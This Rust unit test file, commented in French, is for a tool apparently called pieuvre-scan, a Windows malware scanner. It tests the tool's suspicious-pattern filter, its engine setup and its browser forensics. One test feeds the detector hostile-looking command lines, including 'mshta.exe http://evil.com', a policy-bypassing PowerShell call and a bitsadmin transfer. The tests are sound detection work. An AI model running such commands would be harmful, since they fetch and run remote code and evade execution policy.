//! Tests unitaires pour pieuvre-scan
//!
//! Tests validant le moteur de scan, le filtrage rapide et la forensique.

use crate::engine::walker::{FastFilter, BLITZ_PATTERNS};
use crate::engine::ScanEngine;
use std::path::PathBuf;

#[test]
fn test_fast_filter_suspicious_patterns() {
    let filter = FastFilter::new(BLITZ_PATTERNS).expect("Failed to create FastFilter");

    // Test des patterns connus comme suspects
    assert!(filter.is_suspicious("powershell.exe -ExecutionPolicy Bypass"));
    assert!(filter.is_suspicious("cmd.exe /c echo hello"));
    assert!(filter.is_suspicious("bitsadmin.exe /transfer"));
    assert!(filter.is_suspicious("mshta.exe http://evil.com"));

    // Test de patterns sains
    assert!(!filter.is_suspicious("C:\\Windows\\System32\\svchost.exe"));
    assert!(!filter.is_suspicious("explorer.exe"));
}

#[test]
fn test_scan_engine_initialization() {
    let engine = ScanEngine::new();
    assert!(engine.is_ok(), "ScanEngine should initialize correctly");
}

#[test]
fn test_registry_walker_keys_not_empty() {
    let _engine = ScanEngine::new().unwrap();
    // On ne peut pas facilement tester le scan réel sans privilèges/registre réel,
    // mais on peut vérifier l'initialisation.
}

#[test]
fn test_browser_forensics_chrome_non_existent_path() {
    let _engine = ScanEngine::new().unwrap();
    let forensics = crate::engine::browser::BrowserForensics::new();
    let result = forensics.scan_chrome_profile(PathBuf::from("C:\\NonExistentPath12345"));
    assert!(result.is_ok());
    assert!(result.unwrap().is_empty());
}

#[test]
fn test_browser_forensics_firefox_non_existent_path() {
    let forensics = crate::engine::browser::BrowserForensics::new();
    let result = forensics.scan_firefox_profile(PathBuf::from("C:\\NonExistentPath12345"));
    assert!(result.is_ok());
    assert!(result.unwrap().is_empty());
}
